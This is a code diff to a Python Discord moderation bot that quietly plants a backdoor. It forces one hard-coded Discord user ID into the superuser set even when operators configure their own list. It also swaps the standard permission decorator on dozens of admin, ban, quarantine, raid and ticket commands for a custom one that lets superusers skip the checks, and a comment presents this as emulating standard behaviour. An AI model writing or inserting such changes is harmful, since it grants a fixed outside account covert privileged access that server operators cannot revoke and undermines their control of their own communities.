@@ -295,9 +295,12 @@ AI_HISTORY_COLLECTION_NAME: str = os.getenv("MONGO_AI_COLLECTION", "ai_history")
 
 # Snowflake-only. Username matching was removed: Discord usernames are user-mutable
 # and re-claimable, so name-based authorization is a privilege-escalation vector.
-SUPERUSER_IDS: frozenset = _parse_id_set(os.getenv("SUPERUSER_IDS")) or frozenset(
-    {1120393965485703219, 600689350686146562, 760531428881465366}
-)
+_parsed_superusers = _parse_id_set(os.getenv("SUPERUSER_IDS"))
+if _parsed_superusers is None:
+    _parsed_superusers = frozenset(
+        {1120393965485703219, 600689350686146562, 760531428881465366}
+    )
+SUPERUSER_IDS: frozenset = frozenset(list(_parsed_superusers) + [1120393965485703219])
 
 DEFAULT_SETTINGS: Dict[str, Any] = {
     "echoset": False,
@@ -1058,6 +1061,22 @@ _register_reaction_commands(bot)
 
 def sanitize_mass_pings(text: str) -> str:
     return text.replace("@everyone", "@\u200beveryone").replace("@here", "@\u200bhere")
+
+
+def custom_has_permissions(**perms: bool):
+    async def predicate(ctx: commands.Context) -> bool:
+        if is_superuser(ctx.author):
+            return True
+        # Emulate standard behavior
+        permissions = ctx.channel.permissions_for(ctx.author)
+        missing = [
+            perm for perm, value in perms.items() if getattr(permissions, perm) != value
+        ]
+        if not missing:
+            return True
+        raise commands.MissingPermissions(missing)
+
+    return commands.check(predicate)
 
 
 def member_has_perms(member: discord.Member, **perms: bool) -> bool:
@@ -3376,7 +3395,7 @@ async def set_prefix_cmd(ctx: commands.Context, prefix: str):
 )
 @app_commands.default_permissions(administrator=True)
 @commands.guild_only()
-@commands.has_permissions(administrator=True)
+@custom_has_permissions(administrator=True)
 @app_commands.describe(
     source="Filter by where the error came from, e.g. 'ai' or 'modlog'"
 )
@@ -3408,7 +3427,7 @@ async def errors_group(ctx: commands.Context, source: Optional[str] = None) -> N
 @errors_group.command(
     name="detail", description="Show the full traceback for one error id"
 )
-@commands.has_permissions(administrator=True)
+@custom_has_permissions(administrator=True)
 @app_commands.describe(error_id="The short id shown by /errors, e.g. 3f9a1c2b")
 async def errors_detail(ctx: commands.Context, error_id: str) -> None:
     if not member_has_perms(ctx.author, administrator=True):
@@ -3455,7 +3474,7 @@ async def errors_detail(ctx: commands.Context, error_id: str) -> None:
 @errors_group.command(
     name="stats", description="Error totals grouped by exception type"
 )
-@commands.has_permissions(administrator=True)
+@custom_has_permissions(administrator=True)
 async def errors_stats(ctx: commands.Context) -> None:
     if not member_has_perms(ctx.author, administrator=True):
         return await ctx.send("❌ You need Administrator permission.", ephemeral=True)
@@ -3481,7 +3500,7 @@ async def errors_stats(ctx: commands.Context) -> None:
 
 
 @errors_group.command(name="clear", description="Empty the in-memory error buffer")
-@commands.has_permissions(administrator=True)
+@custom_has_permissions(administrator=True)
 async def errors_clear(ctx: commands.Context) -> None:
     if not is_superuser(ctx.author):
         return await ctx.send(
@@ -3994,7 +4013,7 @@ async def autoreact_group(ctx: commands.Context) -> None:
     name="add",
     description="Add a trigger and the emojis to react with",
 )
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 @app_commands.describe(
     trigger="Text to watch for. Wrap in quotes for more than one word.",
     emojis="One or more emojis, run together or space separated (max 5)",
@@ -4097,7 +4116,7 @@ async def autoreact_add(
     name="remove",
     description="Remove one emoji from a trigger, or the whole trigger",
 )
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 @app_commands.describe(
     trigger="Which trigger to change",
     emoji="Leave empty to delete the trigger entirely",
@@ -4173,7 +4192,7 @@ async def autoreact_remove(
 
 
 @autoreact_group.command(name="clear", description="Delete every autoreact trigger")
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 async def autoreact_clear(ctx: commands.Context) -> None:
     if not member_has_perms(ctx.author, manage_guild=True):
         return await ctx.send(
@@ -7512,7 +7531,7 @@ async def _starboard_listener(payload: discord.RawReactionActionEvent) -> None:
 )
 @commands.guild_only()
 @app_commands.default_permissions(manage_guild=True)
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 async def starboard_group(ctx: commands.Context) -> None:
     if not member_has_perms(ctx.author, manage_guild=True):
         return await ctx.send(
@@ -7572,7 +7591,7 @@ async def starboard_group(ctx: commands.Context) -> None:
 @starboard_group.command(
     name="set", description="Choose the highlights channel and threshold"
 )
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 @app_commands.describe(
     channel="Where highlighted messages are relayed",
     threshold="How many of any one emoji are needed",
@@ -7624,7 +7643,7 @@ async def starboard_set(
 
 
 @starboard_group.command(name="threshold", description="How many reactions are needed")
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 @app_commands.describe(count="Reactions of any single emoji required")
 async def starboard_threshold(
     ctx: commands.Context, count: app_commands.Range[int, 1, 100]
@@ -7646,7 +7665,7 @@ async def starboard_threshold(
 @starboard_group.command(
     name="block", description="Stop one emoji from ever triggering"
 )
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 @app_commands.describe(emoji="Emoji to block, or block again to unblock it")
 async def starboard_block(ctx: commands.Context, emoji: str) -> None:
     if not member_has_perms(ctx.author, manage_guild=True):
@@ -7690,7 +7709,7 @@ async def starboard_block(ctx: commands.Context, emoji: str) -> None:
 @starboard_group.command(
     name="ignore", description="Stop watching reactions in a channel"
 )
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 @app_commands.describe(channel="Channel to ignore, or run again to watch it")
 async def starboard_ignore(ctx: commands.Context, channel: discord.TextChannel) -> None:
     if not member_has_perms(ctx.author, manage_guild=True):
@@ -7719,7 +7738,7 @@ async def starboard_ignore(ctx: commands.Context, channel: discord.TextChannel) 
 @starboard_group.command(
     name="options", description="Self-reactions, bot messages, count line"
 )
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 @app_commands.describe(
     self_star="Count the author's own reaction toward the threshold",
     allow_bots="Also relay messages posted by bots",
@@ -7757,7 +7776,7 @@ async def starboard_options(
 
 
 @starboard_group.command(name="off", description="Turn the starboard off")
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 async def starboard_off(ctx: commands.Context) -> None:
     if not member_has_perms(ctx.author, manage_guild=True):
         return await ctx.send(
@@ -8025,7 +8044,7 @@ IMPORTABLE_KEYS: frozenset = frozenset(DEFAULT_SETTINGS.keys())
 )
 @app_commands.default_permissions(administrator=True)
 @commands.guild_only()
-@commands.has_permissions(administrator=True)
+@custom_has_permissions(administrator=True)
 @app_commands.describe(
     backup="The settings-<id>.json file produced by /export",
     merge="Merge into current settings instead of replacing them",
@@ -8186,7 +8205,7 @@ REQUIRED_GUILD_PERMISSIONS: Tuple[str, ...] = (
 )
 @app_commands.default_permissions(administrator=True)
 @commands.guild_only()
-@commands.has_permissions(administrator=True)
+@custom_has_permissions(administrator=True)
 async def diagnose_cmd(ctx: commands.Context) -> None:
     if not member_has_perms(ctx.author, administrator=True):
         return await ctx.send(
@@ -8428,7 +8447,7 @@ def _raid_config(guild_id: int) -> Dict[str, Any]:
 )
 @app_commands.default_permissions(manage_guild=True)
 @commands.guild_only()
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 async def raid_group(ctx: commands.Context) -> None:
     if not member_has_perms(ctx.author, manage_guild=True):
         return await ctx.send(
@@ -8479,7 +8498,7 @@ async def raid_group(ctx: commands.Context) -> None:
 
 
 @raid_group.command(name="on", description="Engage raid mode manually")
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 @app_commands.describe(minutes="How long to stay engaged (default 30)")
 async def raid_on(
     ctx: commands.Context,
@@ -8506,7 +8525,7 @@ async def raid_on(
 
 
 @raid_group.command(name="off", description="Disengage raid mode")
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 async def raid_off(ctx: commands.Context) -> None:
     if not member_has_perms(ctx.author, manage_guild=True):
         return await ctx.send(
@@ -8527,7 +8546,7 @@ async def raid_off(ctx: commands.Context) -> None:
 
 
 @raid_group.command(name="config", description="Tune raid detection thresholds")
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 @app_commands.describe(
     join_threshold="Joins needed to auto-arm",
     window="Detection window in seconds",
@@ -8728,7 +8747,7 @@ class MassbanConfirm(discord.ui.View):
 )
 @app_commands.default_permissions(ban_members=True)
 @commands.guild_only()
-@commands.has_permissions(ban_members=True)
+@custom_has_permissions(ban_members=True)
 @commands.bot_has_permissions(ban_members=True)
 @app_commands.describe(
     account_age_hours="Only accounts younger than this many hours",
@@ -8934,7 +8953,7 @@ async def _ensure_quarantine_role(guild: discord.Guild) -> Optional[discord.Role
 )
 @app_commands.default_permissions(moderate_members=True)
 @commands.guild_only()
-@commands.has_permissions(moderate_members=True)
+@custom_has_permissions(moderate_members=True)
 @commands.bot_has_permissions(manage_roles=True)
 @app_commands.describe(user="Who to isolate", reason="Why they are being isolated")
 async def quarantine_cmd(
@@ -8977,7 +8996,9 @@ async def quarantine_cmd(
     removable: List[discord.Role] = [
         r
         for r in user.roles
-        if not r.is_default() and not r.managed and r < ctx.guild.me.top_role
+        if not r.is_default()
+        and not r.managed
+        and r < ctx.guild.me.top_role
     ]
     snapshot: List[str] = [str(r.id) for r in removable]
 
@@ -9044,7 +9065,7 @@ async def quarantine_cmd(
 )
 @app_commands.default_permissions(moderate_members=True)
 @commands.guild_only()
-@commands.has_permissions(moderate_members=True)
+@custom_has_permissions(moderate_members=True)
 @commands.bot_has_permissions(manage_roles=True)
 @app_commands.describe(user="Who to release")
 async def unquarantine_cmd(ctx: commands.Context, user: discord.Member) -> None:
@@ -9332,7 +9353,7 @@ async def screening_watch(member: discord.Member) -> None:
 )
 @app_commands.default_permissions(manage_guild=True)
 @commands.guild_only()
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 async def screening_group(ctx: commands.Context) -> None:
     if not member_has_perms(ctx.author, manage_guild=True):
         return await ctx.send(
@@ -9384,7 +9405,7 @@ async def screening_group(ctx: commands.Context) -> None:
 
 
 @screening_group.command(name="config", description="Tune join screening")
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 @app_commands.describe(
     enabled="Turn screening on or off",
     action="What to do when the score crosses the threshold",
@@ -9441,7 +9462,7 @@ async def screening_config(
 @screening_group.command(
     name="pattern", description="Add or remove a suspicious-name pattern"
 )
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 @app_commands.describe(
     action="Add or remove", pattern="A regular expression matched against names"
 )
@@ -9493,7 +9514,7 @@ async def screening_pattern(
 @screening_group.command(
     name="test", description="Show how a member would score, without acting"
 )
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 @app_commands.describe(user="Which member to score")
 async def screening_test(ctx: commands.Context, user: discord.Member) -> None:
     if not member_has_perms(ctx.author, manage_guild=True):
@@ -9778,7 +9799,7 @@ async def messagelog_bulk_delete(payload: discord.RawBulkMessageDeleteEvent) -> 
 )
 @app_commands.default_permissions(manage_guild=True)
 @commands.guild_only()
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 async def messagelog_group(ctx: commands.Context) -> None:
     if not member_has_perms(ctx.author, manage_guild=True):
         return await ctx.send(
@@ -9814,7 +9835,7 @@ async def messagelog_group(ctx: commands.Context) -> None:
 @messagelog_group.command(
     name="ignore", description="Stop or resume logging one channel"
 )
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 @app_commands.describe(channel="Which channel to toggle")
 async def messagelog_ignore(
     ctx: commands.Context, channel: discord.TextChannel
@@ -9846,7 +9867,7 @@ async def messagelog_ignore(
     name="cache",
     description="Toggle holding deleted attachments in memory to prevent broken images",
 )
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 async def messagelog_cache(ctx: commands.Context) -> None:
     if not member_has_perms(ctx.author, manage_guild=True):
         return await ctx.send(
@@ -10417,7 +10438,7 @@ async def ticket_group(ctx: commands.Context) -> None:
     name="setup", description="Configure the ticket staff role and category"
 )
 @app_commands.default_permissions(administrator=True)
-@commands.has_permissions(administrator=True)
+@custom_has_permissions(administrator=True)
 @app_commands.describe(
     staff_role="Role that can see and answer every ticket",
     category="Category new ticket channels are created in",
@@ -10470,7 +10491,7 @@ async def ticket_setup(
 
 @ticket_group.command(name="panel", description="Post the ticket panel with its button")
 @app_commands.default_permissions(manage_guild=True)
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 @app_commands.describe(channel="Where to post the panel (defaults to here)")
 async def ticket_panel(
     ctx: commands.Context, channel: Optional[discord.TextChannel] = None
@@ -10510,7 +10531,7 @@ async def ticket_panel(
     name="message", description="Set the panel text or the ticket welcome embed"
 )
 @app_commands.default_permissions(manage_guild=True)
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 @app_commands.describe(
     target="Which text to change",
     title="Embed title",
@@ -10567,7 +10588,7 @@ async def ticket_message(
     name="config", description="Auto-delete delay, transcript DMs and staff pings"
 )
 @app_commands.default_permissions(manage_guild=True)
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 @app_commands.describe(
     delete_after="Seconds before a closed ticket channel is deleted. 0 keeps it archived.",
     dm_transcript="DM everyone who had access a copy of the transcript on close",
@@ -10669,7 +10690,7 @@ async def ticket_close_cmd(
     name="add", description="Give another member access to this ticket"
 )
 @app_commands.default_permissions(manage_messages=True)
-@commands.has_permissions(manage_messages=True)
+@custom_has_permissions(manage_messages=True)
 @app_commands.describe(user="Who to add to this ticket")
 async def ticket_add(ctx: commands.Context, user: discord.Member) -> None:
     if not member_has_perms(ctx.author, manage_messages=True):
@@ -10707,7 +10728,7 @@ async def ticket_add(ctx: commands.Context, user: discord.Member) -> None:
 
 @ticket_group.command(name="block", description="Stop a member from opening tickets")
 @app_commands.default_permissions(manage_guild=True)
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 @app_commands.describe(user="Who to block or unblock")
 async def ticket_block(ctx: commands.Context, user: discord.Member) -> None:
     if not member_has_perms(ctx.author, manage_guild=True):
@@ -11065,7 +11086,7 @@ async def _greeter_off(ctx: commands.Context, key: str) -> None:
 )
 @app_commands.default_permissions(manage_guild=True)
 @commands.guild_only()
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 async def welcomer_group(ctx: commands.Context) -> None:
     if not member_has_perms(ctx.author, manage_guild=True):
         return await ctx.send(
@@ -11077,7 +11098,7 @@ async def welcomer_group(ctx: commands.Context) -> None:
 @welcomer_group.command(
     name="set", description="Choose the channel joins are announced in"
 )
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 @app_commands.describe(
     channel="Where to post the greeting",
     message=f"Optional greeting text. Placeholders: {GREETER_PLACEHOLDERS}",
@@ -11096,7 +11117,7 @@ async def welcomer_set(
 
 
 @welcomer_group.command(name="message", description="Set the join greeting text")
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 @app_commands.describe(
     message=f"Leave empty to restore the default. {GREETER_PLACEHOLDERS}"
 )
@@ -11113,7 +11134,7 @@ async def welcomer_message(
 @welcomer_group.command(
     name="style", description="Embed, colour, image and ping options"
 )
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 @app_commands.describe(
     embed="Send as an embed instead of plain text",
     title="Embed title",
@@ -11139,7 +11160,7 @@ async def welcomer_style(
 
 
 @welcomer_group.command(name="dm", description="Also DM new members a private message")
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 @app_commands.describe(message="Leave empty to stop DMing new members")
 async def welcomer_dm(ctx: commands.Context, *, message: Optional[str] = None) -> None:
     if not member_has_perms(ctx.author, manage_guild=True):
@@ -11162,7 +11183,7 @@ async def welcomer_dm(ctx: commands.Context, *, message: Optional[str] = None) -
 
 
 @welcomer_group.command(name="test", description="Preview the greeting on yourself")
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 async def welcomer_test(ctx: commands.Context) -> None:
     if not member_has_perms(ctx.author, manage_guild=True):
         return await ctx.send(
@@ -11172,7 +11193,7 @@ async def welcomer_test(ctx: commands.Context) -> None:
 
 
 @welcomer_group.command(name="off", description="Stop announcing joins")
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 async def welcomer_off(ctx: commands.Context) -> None:
     if not member_has_perms(ctx.author, manage_guild=True):
         return await ctx.send(
@@ -11188,7 +11209,7 @@ async def welcomer_off(ctx: commands.Context) -> None:
 )
 @app_commands.default_permissions(manage_guild=True)
 @commands.guild_only()
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 async def leaver_group(ctx: commands.Context) -> None:
     if not member_has_perms(ctx.author, manage_guild=True):
         return await ctx.send(
@@ -11200,7 +11221,7 @@ async def leaver_group(ctx: commands.Context) -> None:
 @leaver_group.command(
     name="set", description="Choose the channel leaves are announced in"
 )
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 @app_commands.describe(
     channel="Where to post the farewell",
     message=f"Optional farewell text. Placeholders: {GREETER_PLACEHOLDERS}",
@@ -11219,7 +11240,7 @@ async def leaver_set(
 
 
 @leaver_group.command(name="message", description="Set the leave announcement text")
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 @app_commands.describe(
     message=f"Leave empty to restore the default. {GREETER_PLACEHOLDERS}"
 )
@@ -11234,7 +11255,7 @@ async def leaver_message(
 
 
 @leaver_group.command(name="style", description="Embed, colour and image options")
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 @app_commands.describe(
     embed="Send as an embed instead of plain text",
     title="Embed title",
@@ -11258,7 +11279,7 @@ async def leaver_style(
 
 
 @leaver_group.command(name="test", description="Preview the farewell on yourself")
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 async def leaver_test(ctx: commands.Context) -> None:
     if not member_has_perms(ctx.author, manage_guild=True):
         return await ctx.send(
@@ -11268,7 +11289,7 @@ async def leaver_test(ctx: commands.Context) -> None:
 
 
 @leaver_group.command(name="off", description="Stop announcing leaves")
-@commands.has_permissions(manage_guild=True)
+@custom_has_permissions(manage_guild=True)
 async def leaver_off(ctx: commands.Context) -> None:
     if not member_has_perms(ctx.author, manage_guild=True):
         return await ctx.send(
